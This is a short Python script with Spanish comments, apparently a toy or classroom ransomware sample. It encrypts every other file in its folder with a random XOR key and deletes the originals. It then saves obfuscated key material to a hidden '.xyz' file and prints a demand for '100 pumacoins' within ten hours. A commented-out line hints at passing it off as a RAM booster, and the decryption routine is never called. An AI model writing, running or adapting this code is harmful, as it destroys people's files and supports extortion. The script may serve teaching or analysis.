# -*- coding: utf-8 -*-
from sys import argv, version_info
import os

assert version_info[0] == 3, 'USA PYTHON 3'

#print('Aumentando memoria RAM, espera...')

def xx(file):
    with open(file+'.enc', 'wb') as z:
        z.write(
            (lambda file: bytes([file[i] ^ k[i%16] for i in range(len(file))]))
                (open(file, 'rb').read())
        )

    os.remove(file)

def vacuna(file):
    with open(file.replace('.enc', ''), 'wb') as z:
        z.write(
            (lambda file: bytes([file[i] ^ k[i%16] for i in range(len(file))]))
                (open(file, 'rb').read())
        )

    os.remove(file)

_, _, x = next(os.walk('./')) # Obtenemos todos los archivos que estén en donde está este script.
x.remove(argv[0]) # Removemos de la lista de archivos este script.

y = '\x2e'

r = os.urandom; k = r(16) # Generamos una cadena de 16 bits aleatoria.

print(k)

list(map(xx, x)) # Encriptamos los archivos con la cadena de 16 bits que obtuvimos anteriormente.
ul = int.from_bytes(k, 'big')

d, k = map(lambda x: int.from_bytes(k, 'big'), [0xba, 0xbe]) # Convertimos el valor de k a entero y lo guardamos en dos copias, d y k.
d |= 1 # Bit-wise or. Se deja igual a la d.

y += '\x78'

c = r(1)[0] | (1<<7)
k = d * k % (1<<c)

# Se pasa todo a bytes.
d, k = map(lambda x: x.to_bytes(32, 'big'), [d, k])
c = bytes([c])

# Se escribe la suma de c, d y k en una archivo .xyz

y += '\x79\x7a'

with open(y, 'wb') as z:
    z.write(c+d+k)

print('\n😈😈😈😈 Archivos encriptados JAJAJAJA 😈😈😈😈\nManda 100 pumacoins a la dirección 0x5325900 en las próximas 10 horas o morirán para siempre')
